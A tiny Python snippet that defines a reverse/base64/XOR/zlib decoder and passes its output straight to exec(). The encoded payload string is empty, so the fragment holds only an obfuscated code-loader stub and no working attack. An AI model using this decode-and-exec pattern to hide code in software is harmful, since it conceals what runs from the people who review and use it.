import zlib, base64

def _tyson_decrypt(_cipher):
    _l1 = _cipher[::-1]
    _l2 = base64.b64decode(_l1.encode('ascii'))
    _l3 = bytes([b ^ 0x4B for b in _l2])
    _l4 = zlib.decompress(_l3).decode('utf-8')
    return _l4

exec(_tyson_decrypt(""), globals())

